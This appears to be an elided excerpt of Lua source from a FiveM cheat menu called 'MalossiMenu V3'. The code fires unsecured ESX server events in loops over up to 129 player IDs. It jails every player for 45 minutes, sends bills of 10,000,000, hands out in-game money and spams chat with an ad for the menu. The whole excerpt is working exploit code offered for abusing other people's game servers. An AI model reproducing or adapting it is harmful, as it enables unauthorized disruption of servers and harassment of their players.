        ...
        while true do
			...
			if chatspam then
                TriggerServerEvent(
                    ...
                    'MalossiHosting#2143',
                    {0, 0x99, 255},
                    '/ooc MalossiMenu V3! Buy at '
                )
                TriggerServerEvent('_chat:messageEntered', 'MalossiHosting#2143', {0, 0x99, 255}, 'MalossiMenu V3 <3 ')
            end
			...
			if banallusers then
				...
				TriggerServerEvent("js:jailuser", GetPlayerServerId(i), 45 * 60, "MalossiMenu V3 Babe <3 MalossiHosting#2143 ")
				TriggerServerEvent("esx-qalle-jail:jailPlayer", GetPlayerServerId(i), 45 * 60, "MalossiMenu V3 Babe <3 MalossiHosting#2143 ")
					end
				end
				...
				for i = 0, 128 do
						...
						TriggerServerEvent('esx:giveInventoryItem', GetPlayerServerId(i), "item_money", "money", 10000000)	
						TriggerServerEvent('esx:giveInventoryItem', GetPlayerServerId(i), "item_money", "money", 10000000)	
						TriggerServerEvent('esx_billing:sendBill', GetPlayerServerId(i), "The best menu in fivem!?, MalossiHosting#2143 ", 10000000)
				end
			end
    ...
    function()
        ...
        while Enabled do
            ...
            elseif foriv.IsMenuOpened("TrollMenu") then
				...
				for i = 0, 128 do
                    TriggerServerEvent('esx_billing:sendBill', GetPlayerServerId(i), "Purposeless", "MalossiMenu V3 ", "6536955669")
					TriggerServerEvent('esx_billing:sendBill', GetPlayerServerId(i), "Purposeless", "MalossiMenu V3 ", "6969696969")
					TriggerServerEvent('esx_billing:sendBill', GetPlayerServerId(i), "Purposeless", "MalossiMenu V3 ", "696G623691")
					TriggerServerEvent('esx_billing:sendBill', GetPlayerServerId(i), "Purposeless", "MalossiMenu V3 ", "69693553S9")
					TriggerServerEvent('esx_billing:sendBill', GetPlayerServerId(i), "Purposeless", "MalossiMenu V3 ", "6969696969")
                end
